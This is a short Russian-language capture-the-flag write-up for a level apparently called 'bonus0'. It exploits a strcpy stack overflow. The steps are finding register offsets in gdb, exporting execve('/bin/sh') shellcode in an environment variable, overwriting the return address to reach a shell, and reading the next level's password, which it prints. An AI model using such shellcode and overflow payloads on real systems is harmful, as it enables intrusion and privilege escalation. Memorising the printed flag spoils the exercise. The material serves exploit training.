# Вызов strcpy, уязвимого к переполнению буфера

`=> 0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>`

# Найдем, какое смещение программы segfault
```
gdb> pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb> r
-
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
-
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
SIGSEGV
gdb> pattern search
[...]
Registers contain pattern buffer:
EBP+0 found at offset: 9
EIP+0 found at offset: 13
[...]
```
# Теперь нам нужно знать, соответствует ли смещение первой или второй строке
```
gdb> r
-
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
-
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
SIGSEGV
```
# Мы знаем, что смещение соответствует второй строке

# Экспортируем наш shellcode
```
$> export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
```
# Пишем небольшую программу для поиска адресов переменных окружения
```
$> cat getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```
```
$> gcc getenv.c -o getenv; ./getenv SHELLCODE
SHELLCODE is at 0xbffff94a
```

# Теперь проблема в том, как отправить данные на `read` два раза, используя один файл
# Нам просто нужно заполнить первый буфер
```
$> python -c "print 'A'*4095 + '\n' + 'B'*9 + '\x4a\xf9\xff\xbf' + 'C'*50" > /tmp/payload_bonus0
$> cat /tmp/payload_bonus0  - | ./bonus0
```
```
> cat /home/user/bonus1/.pass
```
>cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

# ╮(￣_￣)╭